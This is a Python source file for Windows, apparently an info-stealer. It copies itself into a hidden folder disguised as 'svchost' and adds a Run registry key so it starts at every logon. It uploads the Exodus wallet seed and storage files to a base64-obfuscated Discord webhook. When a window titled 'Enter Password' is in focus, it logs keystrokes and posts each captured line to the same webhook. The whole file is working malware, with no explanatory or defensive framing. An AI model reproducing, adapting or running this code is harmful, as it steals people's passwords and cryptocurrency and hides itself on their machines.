import win32gui
import base64
import time
from pynput import keyboard
import requests
import threading
import queue
import winreg
import os
import sys
import shutil

def ispersist(hpath,keyn):
    if not os.path.exists(hpath):
        return False
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ
        )
        winreg.QueryValueEx(key,keyn)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False
def persist():
    cp = os.path.abspath(sys.argv[0])
    hd = os.path.join(os.environ["APPDATA"], ".cache","svchost")
    hp = os.path.join(hd, "svchost.py")
    kn = "SystemService"
    if ispersist(hd,kn):
        return
    os.makedirs(hd,exist_ok=True)
    os.system(f"attrib +h +s '{hd}'")
    shutil.copy2(cp,hd)
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key,kn,0,winreg.REG_SZ,f'pythonw "{hp}"')
    winreg.CloseKey(key)

q = queue.Queue()
hook = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MzQwMjY4MzU1Njc2MTc1Mi92ZUhSRktwWjFVR20xM3h1UzJOZEJLZ243UVBhS1JILU9jUWVySHVmU3pDQllacnJPSzl1R3F5SFVPRFNKVUxicldqOQ==").decode()
listener = None
running = threading.Event()
wokerthread = None
buf = ""
ad = os.environ['APPDATA']
ses = os.path.join(ad,'Exodus/exodus.wallet',"seed.seco")
sts = os.path.join(ad,'Exodus/exodus.wallet',"storage.seco")
with open(ses, 'rb') as f1, open(sts, 'rb') as f2:
    requests.post(hook, files={'seed': (os.path.basename(ses), f1)})
    requests.post(hook, files={'storage': (os.path.basename(sts), f2)})
def worker():
    global buf, running
    while running:
        event = q.get()
        if event is None:
            break
        if event["type"] == "char":
            buf+=event["value"]
        elif event["type"] == "enter":
            print("Sending buf!")
            data = {"username": "tricky wooker","content": f"Potential password: ```{buf}```"}
            requests.post(hook,data)
            buf = ""

def on_press(key):
    try:
        q.put({"type":"char","value":key.char})
    except AttributeError:
        if key == keyboard.Key.enter:
            q.put({"type":"enter"})

def on_release():
    pass

def start():
    global listener,wokerthread
    running.set()
    wokerthread = threading.Thread(target=worker, daemon=True)
    wokerthread.start()
    listener = keyboard.Listener(on_press=on_press,on_release=on_release)
    listener.start()

def stop():
    global listener
    running.clear()
    q.put(None)
    if listener:
        listener.stop()

def getAgent():
    on = False
    while (1):
        if win32gui.GetWindowText(win32gui.GetForegroundWindow()) == base64.b64decode(b"RW50ZXIgUGFzc3dvcmQ=").decode() and on == False:
            start()
            print("starting")
            on = True
        elif win32gui.GetWindowText(win32gui.GetForegroundWindow()) != base64.b64decode(b"RW50ZXIgUGFzc3dvcmQ=").decode() and on == True:
            on = False
            stop()
            print("stoppings")
        time.sleep(0.25)

persist()
getAgent()